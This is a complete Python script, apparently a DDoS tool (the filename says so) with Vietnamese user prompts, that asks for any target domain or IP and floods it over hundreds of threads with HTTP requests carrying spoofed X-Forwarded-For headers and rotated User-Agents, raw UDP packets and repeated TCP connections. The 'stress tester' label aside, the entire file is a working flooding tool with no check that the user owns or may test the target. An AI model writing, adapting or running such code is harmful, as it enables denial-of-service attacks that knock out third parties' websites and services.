# ddos_tool.py — HTTP/UDP/TCP stress tester
# Runtime: Python 3.11+
# Chạy: python ddos_tool.py
# Deps: pip install requests

import subprocess, sys, socket, threading, time, random, struct, os

def pip_install(*pkgs):
    for pkg in pkgs:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", pkg, "-q",
             "--disable-pip-version-check"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

try:
    import requests
except ImportError:
    pip_install("requests")
    import requests

# ── CONFIG ────────────────────────────────────────────────────
THREAD_COUNT = 500
DURATION     = 60    # giây
# ─────────────────────────────────────────────────────────────

AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
]

stop_flag   = threading.Event()
hit_counter = 0
lock        = threading.Lock()

def resolve(domain: str) -> str:
    try:
        return socket.gethostbyname(domain)
    except Exception:
        return domain

# ── HTTP FLOOD ────────────────────────────────────────────────
def http_flood(url: str, tid: int):
    global hit_counter
    session = requests.Session()
    while not stop_flag.is_set():
        try:
            headers = {
                "User-Agent":      random.choice(AGENTS),
                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
                "Cache-Control":   "no-cache",
                "Pragma":          "no-cache",
                "Connection":      "keep-alive",
            }
            session.get(url, headers=headers, timeout=3,
                        allow_redirects=False)
            with lock:
                hit_counter += 1
        except Exception:
            pass

# ── UDP FLOOD ─────────────────────────────────────────────────
def udp_flood(ip: str, port: int):
    global hit_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random.randbytes(1024)
    while not stop_flag.is_set():
        try:
            sock.sendto(payload, (ip, port))
            with lock:
                hit_counter += 1
        except Exception:
            pass
    sock.close()

# ── TCP FLOOD ─────────────────────────────────────────────────
def tcp_flood(ip: str, port: int):
    global hit_counter
    while not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            s.send(random.randbytes(512))
            with lock:
                hit_counter += 1
            s.close()
        except Exception:
            pass

# ── STATS DISPLAY ─────────────────────────────────────────────
def display_stats(duration: int):
    start = time.time()
    while not stop_flag.is_set():
        elapsed = time.time() - start
        with lock:
            rps = hit_counter / max(elapsed, 1)
        print(f"\r[*] requests: {hit_counter:,} | "
              f"rps: {rps:.0f} | "
              f"time: {elapsed:.0f}/{duration}s    ", end="", flush=True)
        time.sleep(0.5)

# ── MAIN ──────────────────────────────────────────────────────
def main():
    print("=" * 55)
    print("  Stress Tester — HTTP / UDP / TCP")
    print("=" * 55)

    target = input("\n[?] nhập domain hoặc IP mục tiêu: ").strip()
    if not target:
        sys.exit(1)

    # clean domain
    target = target.replace("https://","").replace("http://","").split("/")[0]
    url    = f"http://{target}"
    ip     = resolve(target)
    print(f"[*] target: {target} → {ip}")

    method = input("[?] method (1=HTTP 2=UDP 3=TCP 4=ALL) [mặc định 1]: ").strip() or "1"

    try:
        dur = int(input(f"[?] thời gian (giây) [mặc định {DURATION}]: ").strip() or DURATION)
    except ValueError:
        dur = DURATION

    try:
        threads = int(input(f"[?] số threads [mặc định {THREAD_COUNT}]: ").strip() or THREAD_COUNT)
    except ValueError:
        threads = THREAD_COUNT

    print(f"\n[*] bắt đầu — {threads} threads — {dur}s\n")

    workers = []

    for i in range(threads):
        if method in ("1","4"):
            t = threading.Thread(target=http_flood, args=(url, i), daemon=True)
            workers.append(t); t.start()
        if method in ("2","4"):
            t = threading.Thread(target=udp_flood, args=(ip, 80), daemon=True)
            workers.append(t); t.start()
        if method in ("3","4"):
            t = threading.Thread(target=tcp_flood, args=(ip, 80), daemon=True)
            workers.append(t); t.start()

    stats = threading.Thread(target=display_stats, args=(dur,), daemon=True)
    stats.start()

    time.sleep(dur)
    stop_flag.set()
    print(f"\n\n[*] xong — tổng: {hit_counter:,} requests")

if __name__ == "__main__":
    main()